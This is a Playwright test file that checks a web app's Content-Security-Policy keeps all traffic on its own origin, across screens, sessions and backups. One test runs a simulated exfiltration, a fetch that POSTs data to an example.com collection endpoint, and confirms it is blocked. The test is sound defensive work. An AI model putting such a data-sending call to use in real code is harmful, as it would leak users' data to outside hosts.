import { expect, type Page, test } from "@playwright/test";
import { programById } from "../src/lib/plumb/catalog";
import { dayKey, seed, sessionLog, stepHeading, STORE_KEY } from "./helpers";

// Plumb's promise: nothing the app does reaches another origin. These tests hold it to that
// with the real Content-Security-Policy from the build, on every screen.

type Watch = { offOrigin: string[]; violations: () => Promise<string[]> };

/** Records requests to any other origin and every CSP violation the page reports. */
async function watch(page: Page, baseURL: string | undefined): Promise<Watch> {
  const home = new URL(baseURL ?? "http://localhost").origin;
  await page.addInitScript(() => {
    const w = window as unknown as { __csp: string[] };
    w.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => {
      w.__csp.push(`${e.violatedDirective} ${e.blockedURI}`);
    });
  });
  const offOrigin: string[] = [];
  page.on("request", (req) => {
    const url = new URL(req.url());
    if (url.protocol === "data:" || url.protocol === "blob:") return;
    if (url.origin !== home) offOrigin.push(req.url());
  });
  return {
    offOrigin,
    violations: () => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp),
  };
}

async function expectClean(page: Page, w: Watch, label: string) {
  // Give lazy chunks, fonts and audio a moment to load.
  await page.waitForTimeout(400);
  expect(w.offOrigin, `${label}: requests to other origins`).toEqual([]);
  expect(await w.violations(), `${label}: CSP violations`).toEqual([]);
}

test("every page is served with the Content-Security-Policy", async ({ page }) => {
  for (const path of ["/", "/progress", "/session/morning-plumb"]) {
    const res = await page.goto(path);
    const csp = res?.headers()["content-security-policy"] ?? "";
    expect(csp, path).toContain("connect-src 'self'");
    expect(csp, path).toContain("default-src 'none'");
  }
});

test("a script trying to send data elsewhere is blocked", async ({ page, baseURL }) => {
  const w = await watch(page, baseURL);
  await page.goto("/");
  await expect(page.getByRole("main")).toBeVisible();
  const outcome = await page.evaluate(() =>
    fetch("https://example.com/collect", { method: "POST", body: "x" }).then(
      () => "sent",
      () => "blocked",
    ),
  );
  expect(outcome).toBe("blocked");
  expect(w.offOrigin).toEqual([]);
  expect((await w.violations()).some((v) => v.startsWith("connect-src"))).toBe(true);
});

test.describe("no screen talks to another origin or trips the policy", () => {
  for (const path of ["/", "/library", "/progress", "/coach"]) {
    test(path, async ({ page, baseURL }) => {
      const w = await watch(page, baseURL);
      await seed(page, { logs: [sessionLog(dayKey(new Date()))] });
      await page.goto(path);
      await expect(page.getByRole("main")).toBeVisible();
      await expectClean(page, w, path);
    });
  }
});

test("a session with voice coach and earbud controls on stays on the phone", async ({
  page,
  baseURL,
}) => {
  const w = await watch(page, baseURL);
  const program = programById("morning-plumb")!;
  const today = dayKey(new Date());
  await seed(page, { clearances: [{ date: today, clearance: "clear" }] });
  await page.addInitScript((key) => {
    const raw = JSON.parse(localStorage.getItem(key)!);
    raw.state.voice = true;
    raw.state.earbuds = true;
    localStorage.setItem(key, JSON.stringify(raw));
  }, STORE_KEY);
  await page.goto(`/session/${program.id}`);
  await expect(stepHeading(page)).toHaveText(program.steps[0].name);
  // A tap unlocks speech and the earbud audio loop, then two steps run their cues.
  await page.getByRole("button", { name: "Skip" }).click();
  await expect(stepHeading(page)).toHaveText(program.steps[1].name);
  await page.getByRole("button", { name: "Skip" }).click();
  await expectClean(page, w, "session");
});

test("backing up stays on the phone", async ({ page, baseURL }) => {
  const w = await watch(page, baseURL);
  await seed(page, { logs: [sessionLog(dayKey(new Date()))] });
  await page.goto("/progress");
  const download = page.waitForEvent("download");
  await page.getByRole("button", { name: "Download backup" }).click();
  await download;
  await expectClean(page, w, "backup");
});
